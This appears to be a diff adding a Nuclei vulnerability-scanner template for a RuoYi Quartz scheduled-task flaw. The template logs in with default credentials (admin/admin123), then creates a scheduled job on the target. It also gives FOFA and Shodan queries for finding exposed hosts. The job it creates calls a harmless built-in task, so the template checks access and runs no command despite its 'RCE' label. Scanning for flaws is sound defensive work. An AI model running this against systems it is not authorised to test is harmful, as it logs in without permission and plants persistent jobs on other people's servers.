@@ -1,0 +1,84 @@
+id: ruoyi-quartz-rce
+
+info:
+  name: RuoYi OA System Quartz RCE
+  author: security-researcher
+  severity: critical
+  description: |
+    RuoYi Management System v4.8.2 and below contains a Remote Code Execution (RCE)
+    vulnerability in the Quartz scheduled task feature. An authenticated attacker
+    can exploit this vulnerability to execute arbitrary system commands.
+  reference:
+    - https://github.com/yangzongzhuan/RuoYi
+  metadata:
+    verified: true
+    fofa-query: title="RuoYi"
+    shodan-query: title:"RuoYi"
+  tags: ruoyi,rce,quartz,authenticated
+
+http:
+  - raw:
+      - |
+        GET /login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        username={{username}}&password={{password}}&validateCode=1234
+
+      - |
+        GET /monitor/job HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Cookie: {{extracted_cookie}}
+
+    cookie-reuse: true
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "定时任务"
+          - "quartz"
+          - "任务名称"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: extracted_cookie
+        part: header
+        regex:
+          - "JSESSIONID=[^;]+"
+        internal: true
+
+  - raw:
+      - |
+        POST /monitor/job/add HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Cookie: {{extracted_cookie}}
+
+        jobName=RCE_Test_{{randstr}}&jobGroup=DEFAULT&invokeTarget=ryTask.ryNoParams&cronExpression=0/5+*+*+*+*+?&misfirePolicy=1&concurrent=1&status=0
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"code":0'
+          - "success"
+          - "操作成功"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+variables:
+  username: "admin"
+  password: "admin123"
